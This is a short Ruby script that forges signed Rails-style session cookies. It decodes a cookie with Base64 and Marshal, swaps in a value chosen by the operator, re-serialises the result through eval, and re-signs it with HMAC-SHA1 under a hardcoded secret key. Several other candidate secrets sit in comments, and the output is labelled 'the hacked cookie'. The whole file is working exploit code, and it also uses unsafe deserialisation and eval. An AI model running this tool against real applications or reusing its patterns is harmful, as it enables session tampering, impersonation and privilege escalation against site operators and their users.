require 'uri'
require 'base64'
require 'readline'
require 'openssl'

def generate_hmac(data, secret)
    OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
end

decoded_original = Marshal.load Base64.decode64 URI.unescape Readline.readline 'original: '
puts "\n Decoded original: #{decoded_original.inspect}\n"

value_to_be_replaced = Readline.readline 'value to be replaced:'
value_to_replace_with = Readline.readline 'value to replace with:'

hacked_value = decoded_original.inspect.sub(value_to_be_replaced, value_to_replace_with)
puts "\nThe hacked value is: #{hacked_value}"

encoded_hacked = Base64.encode64 Marshal.dump eval hacked_value

#secret = 'the_secret'
#secret = 'dMx\354\341\260f\027\0270\212\236c\335\344\006\a\316\323\005\e\315\321\016'
#secret = [100,77,120,354,341,260,102,27,27,48,212,236,99,335,344,6,97,316,323,5,101,315,321,16].pack('c*')
secret = [100, 77, 120, -20, -31, -80, 102, 23, 23, 48, -118, -98, 99, -35, -28, 6, 7, -50, -45, 5, 27, -51, -47, 14].pack('c*')
#secret = [-9, 5, 119, 105, 99, 54, 104, -67, -127, -87, -70, 8, -87, -103, 56, -121, -60, 53, 121, -25, 26, 39, 63, -109].pack('c*')

hmac = generate_hmac(encoded_hacked, secret)

uri_encoded_hacked = URI.escape encoded_hacked

puts "\nThe hacked cookie is: #{uri_encoded_hacked}--#{hmac}"
